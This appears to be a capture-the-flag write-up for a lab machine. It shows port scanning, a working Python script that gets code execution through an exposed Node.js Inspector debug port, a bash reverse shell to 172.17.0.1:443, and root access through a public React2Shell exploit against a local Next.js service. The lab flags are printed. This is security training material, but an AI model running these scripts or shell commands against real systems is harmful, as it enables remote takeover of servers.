# IP
172.17.0.2
# Reconnaissance
```sh
ping -c 2 172.17.0.2

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.060 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.047 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1012ms
rtt min/avg/max/mdev = 0.047/0.053/0.060/0.006 ms
```
# Ports scanning
```sh
sudo nmap -p- -sS -sV -sC 172.17.0.2

PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js (Express middleware)
9229/tcp open  unknown
```
# Web
## Index
![[Pasted image 20260915141014.png]]
## Licenses
![[Pasted image 20260915141045.png]]
## Contact form
![[Pasted image 20260915140930.png]]
# The unknown service
9229 is the default port for the Node.js Inspector
```sh
curl -i http://172.17.0.2:9229/json

HTTP/1.0 200 OK
Content-Type: application/json; charset=UTF-8
Cache-Control: no-cache
Content-Length: 679

[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=172.17.0.2:9229/7bb055f0-835a-4134-9a31-5e95034d09ac",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=172.17.0.2:9229/7bb055f0-835a-4134-9a31-5e95034d09ac",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "7bb055f0-835a-4134-9a31-5e95034d09ac",
  "title": "/home/webuser/node_app/app.js",
  "type": "node",
  "url": "file:///home/webuser/node_app/app.js",
  "webSocketDebuggerUrl": "ws://172.17.0.2:9229/7bb055f0-835a-4134-9a31-5e95034d09ac"
} ]
```
# RCE
## PoC
```python
import asyncio
from websockets.asyncio.client import connect
import json
import sys
cmd = sys.argv[1] if len(sys.argv) > 1 else "id"

async def hello():
    uri = "ws://172.17.0.2:9229/7bb055f0-835a-4134-9a31-5e95034d09ac"
    async with connect(uri) as websocket:
        message = {
                "id": 1,
                "method": "Runtime.evaluate",
                "params": {
                    "expression": f"process.mainModule.require('child_process').execSync({json.dumps(cmd)}).toString()",
                    "returnByValue": True
                },
        }

        print(f"Sending: {message}")
        await websocket.send(json.dumps(message))

        data = json.loads(await websocket.recv())
        print(data["result"]["result"]["value"])

if __name__ == "__main__":
    asyncio.run(hello())
```

```sh
python3 websocket.py

Sending: {'id': 1, 'method': 'Runtime.evaluate', 'params': {'expression': 'process.mainModule.require(\'child_process\').execSync("id").toString()', 'returnByValue': True}}
uid=1001(webuser) gid=1001(webuser) groups=1001(webuser)
```
# Reverse shell
```python
import asyncio
from websockets.asyncio.client import connect
import json
import sys
cmd = sys.argv[1] if len(sys.argv) > 1 else "id"

async def hello():
    uri = "ws://172.17.0.2:9229/7bb055f0-835a-4134-9a31-5e95034d09ac"
    async with connect(uri) as websocket:
        message = {
                "id": 1,
                "method": "Runtime.evaluate",
                "params": {
                    "expression": f"process.mainModule.require('child_process').exec({json.dumps(cmd)}).toString()",
                    "returnByValue": True
                },
        }

        print(f"Sending: {message}")
        await websocket.send(json.dumps(message))

        data = json.loads(await websocket.recv())
        print(data["result"]["result"]["value"])

if __name__ == "__main__":
    asyncio.run(hello())
```

```sh
python3 revshell.py "bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'"
```
# User flag
```sh
cat user.txt
DL{g2QrDUvg3HiqaWeZBbZa}
```
# Privilege Escalation
```sh
ps aux

root           8  0.0  2.0 1202680 83112 ?       Sl   17:00   0:00 npm exec next dev -p 3000 -H 127.0.0.1
```

```sh
curl -s -i http://localhost:3000

HTTP/1.1 200 OK
vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
content-type: text/html
Date: Tue, 15 Sep 2026 18:48:06 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked


    <div style="font-family: sans-serif; padding: 40px; background-color: #f9f9fb; min-height: 100vh; display: flex; justify-content: center; align-items: center;">
      <div style="padding: 40px; border: 1px solid #e1e4e8; border-radius: 12px; background-color: #fff; box-shadow: 0 4px 6px rgba(0,0,0,0.05); max-width: 600px; width: 100%;">
        <h1 style="color: #24292e; margin-top: 0;">Internal Administration Portal</h1>
        <div style="padding: 20px 0; border-top: 1px solid #eee; border-bottom: 1px solid #eee; margin: 20px 0;">
          <p style="color: #586069;"><strong>System Status:</strong> <span style="color: #28a745;">● Operational</span></p>
          <p style="color: #586069;"><strong>Version:</strong> 15.0.0-rc.1</p>
          <p style="color: #586069;"><strong>Environment:</strong> Restricted (Internal Only)</p>
        </div>
        <p style="color: #24292e; line-height: 1.6;">
          Welcome to the internal administration portal. This service is intended for authorized personnel only.
          Please ensure all session activity is logged as per corporate policy.
        </p>
        <div style="marginTop: 30px; font-size: 0.85rem; color: #999;">
          &copy; 2026 Internal Services Corp. All rights reserved.
        </div>
      </div>
    </div>
```
# React2Shell
Exploit CVE-2025-55182
```sh
git clone https://github.com/freeqaz/react2shell.git
cd react2shell.git
```

```sh
./detect.sh http://localhost:3000

[*] React2Shell Detection Probe (CVE-2025-55182 / CVE-2025-66478)
[*] Target: http://localhost:3000

[*] HTTP Status: 500
[?] UNKNOWN - Server returned 500 but without expected pattern
[*] Response body:
Server Error
```

```sh
./exploit-redirect.sh http://localhost:3000 "id"

[*] React2Shell Exploit - redirect exfil mode
[*] Target: http://localhost:3000
[*] Command: id

[+] HTTP 500 - Redirect exfil successful
[+] Command output:
----------------------------------------
�Z �/login?a=dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCk=;307;
----------------------------------------
```

```sh
echo 'dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCk=' | base64 -d
uid=0(root) gid=0(root) groups=0(root)
```

```sh
./exploit-redirect.sh http://localhost:3000 "ls -la /root"

[*] React2Shell Exploit - redirect exfil mode
[*] Target: http://localhost:3000
[*] Command: ls -la /root

[+] HTTP 500 - Redirect exfil successful
[+] Command output:
----------------------------------------
�Z �/login?a=dG90YWwgMzYKZHJ3eC0tLS0tLSAxIHJvb3Qgcm9vdCA0MDk2IEFwciAgMyAwNToxNyAuCmRyd3hyLXhyLXggMSByb290IHJvb3QgNDA5NiBTZXAgMTUgMTc6MDAgLi4KLXJ3LXItLXItLSAxIHJvb3Qgcm9vdCAzMTA2IEFwciAyMiAgMjAyNCAuYmFzaHJjCmRyd3hyLXhyLXggMSByb290IHJvb3QgNDA5NiBBcHIgIDMgMDU6MTcgLm5wbQotcnctci0tci0tIDEgcm9vdCByb290ICAxNjEgQXByIDIyICAyMDI0IC5wcm9maWxlCmRyd3hyLXhyLXggMSByb290IHJvb3QgNDA5NiBTZXAgMTUgMTc6MDAgcmVhY3RfYXBwCi1yLS0tLS0tLS0gMSByb290IHJvb3QgICAyNSBBcHIgIDEgMDU6MzMgcm9vdC50eHQ=;307;
----------------------------------------
```

```sh
echo 'dG90YWwgMzYKZHJ3eC0tLS0tLSAxIHJvb3Qgcm9vdCA0MDk2IEFwciAgMyAwNToxNyAuCmRyd3hyLXhyLXggMSByb290IHJvb3QgNDA5NiBTZXAgMTUgMTc6MDAgLi4KLXJ3LXItLXItLSAxIHJvb3Qgcm9vdCAzMTA2IEFwciAyMiAgMjAyNCAuYmFzaHJjCmRyd3hyLXhyLXggMSByb290IHJvb3QgNDA5NiBBcHIgIDMgMDU6MTcgLm5wbQotcnctci0tci0tIDEgcm9vdCByb290ICAxNjEgQXByIDIyICAyMDI0IC5wcm9maWxlCmRyd3hyLXhyLXggMSByb290IHJvb3QgNDA5NiBTZXAgMTUgMTc6MDAgcmVhY3RfYXBwCi1yLS0tLS0tLS0gMSByb290IHJvb3QgICAyNSBBcHIgIDEgMDU6MzMgcm9vdC50eHQ=' | base64 -d

total 36
drwx------ 1 root root 4096 Apr  3 05:17 .
drwxr-xr-x 1 root root 4096 Sep 15 17:00 ..
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
drwxr-xr-x 1 root root 4096 Apr  3 05:17 .npm
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwxr-xr-x 1 root root 4096 Sep 15 17:00 react_app
-r-------- 1 root root   25 Apr  1 05:33 root.txt
```

# Root flag
```sh
./exploit-redirect.sh http://localhost:3000 "cat /root/root.txt"

[*] React2Shell Exploit - redirect exfil mode
[*] Target: http://localhost:3000
[*] Command: cat /root/root.txt

[+] HTTP 500 - Redirect exfil successful
[+] Command output:
----------------------------------------
�Z �/login?a=REx7WjhHYzVORllNckgzVzR2djVaV2F9;307;
----------------------------------------
```

```sh
echo 'REx7WjhHYzVORllNckgzVzR2djVaV2F9' | base64 -d
DL{Z8Gc5NFYMrH3W4vv5ZWa}
```